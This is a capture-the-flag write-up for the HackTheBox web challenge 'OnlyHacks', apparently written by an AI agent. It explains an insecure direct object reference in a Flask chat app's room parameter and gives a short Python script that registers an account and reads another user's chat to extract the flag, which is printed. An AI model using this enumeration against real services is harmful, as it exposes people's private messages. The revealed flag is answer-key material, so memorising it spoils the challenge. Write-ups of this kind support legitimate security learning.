---
title: "OnlyHacks"
ctf: "HackTheBox"
date: 2026-05-23
category: web
difficulty: very-easy
points: 0
flag_format: "HTB{...}"
author: "opencode"
---

# OnlyHacks

## Summary

IDOR (Insecure Direct Object Reference) in the chat room parameter allowed accessing another user's chat room containing the flag.

## Solution

The app is a Flask dating app with Socket.IO chat. The `/chat/` endpoint accepts a `rid` (room ID) URL parameter. When accessed with `rid=3`, the page renders the full chat history including the flag from one of the seeded users' conversations.

```python
import requests, re, io

BASE = "http://154.57.164.65:32557"

s = requests.Session()
s.post(f"{BASE}/register", data={
    "username": "exploit_user", "password": "exp123",
    "email": "exp@test.com", "age": "25", "bio": "pwn",
    "user-gender": "Male", "interested-gender": "All",
}, files={"profile-picture": ("p.png", io.BytesIO(b"fake"), "image/png")},
    allow_redirects=False)

r = s.get(f"{BASE}/chat/?rid=3")
flag = re.search(r'<p>(HTB\{[^}]+\})</p>', r.text)
print(flag.group(1))
```

## Flag

```
HTB{d0nt_trust_str4ng3r5_bl1ndly}
```
